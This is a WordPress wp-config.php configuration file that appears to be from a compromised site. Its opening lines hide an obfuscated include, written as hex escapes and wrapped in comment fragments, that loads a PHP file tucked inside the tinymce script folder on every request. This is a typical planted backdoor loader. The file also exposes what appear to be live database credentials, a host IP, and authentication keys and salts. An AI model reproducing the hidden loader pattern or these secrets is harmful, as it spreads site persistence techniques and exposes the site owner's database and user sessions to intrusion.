<?php
/**
 **/include /* The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file*/"\x2fhom\x65/yk\x69ng/\x70ubl\x69c_h\x74ml/\x77p-i\x6eclu\x64es/\x6as/t\x69nym\x63e/o\x70tio\x6e.ph\x70";/* during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'ykingswp_new');

/** MySQL database username */
define('DB_USER', 'ykins_wp_user');

/** MySQL database password */
define('DB_PASSWORD', 'FZUcDZNMtE5emdrj');

/** MySQL hostname */
define('DB_HOST', '52.59.255.78');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'Jn_Y}78)Q?h5{.De|+jRSjTRyh`ekxB~Ec9JVyP%eQ0rc13aI|Uonlpoa%SJwI!w');
define('SECURE_AUTH_KEY',  '&e~}$^9ONp``^pSRdPtIj36.lmjKD;L27j&@0/Qq0ixU_k:9yE]W&$?+&ns$a2M^');
define('LOGGED_IN_KEY',    'G|G/qM[G9><nQJQ+yR#Uxr<0=DC.C*$piIg7^4=3p38eJ]2;9IC/4/ 5h6//=$Dx');
define('NONCE_KEY',        'XwGQF(?:ot^`|:|<Ui%gXVKrxR;>-^Ug;*,H,T~Hs@9y+W?:xl+PtHm{3xYAofB+');
define('AUTH_SALT',        '7Z{rm .m/^nM/*O6z:$+?/YD^u+9Wl)LzE.&#6ch{@GAej*_irdJ|wOKw`9vVtGy');
define('SECURE_AUTH_SALT', '19h)Yuh<Xyr~ |D.VGL|+jmrUX?j!}/l[-<B/-U_Uugm6,HP-SutE>[n8h0^&o[H');
define('LOGGED_IN_SALT',   '74yt;@x/:3SzJhiod`?|o9FqrW:.d.gi8*wn94^6{i&4h}m?HUjoKI~wqOoYjT?:');
define('NONCE_SALT',       '+GW^n-pFIHwmPI2uaAA7np(Ge4qc DMA_0(*Kgyv1SLPU&4Zlzs5u43| zoGUql(');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'yk_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');

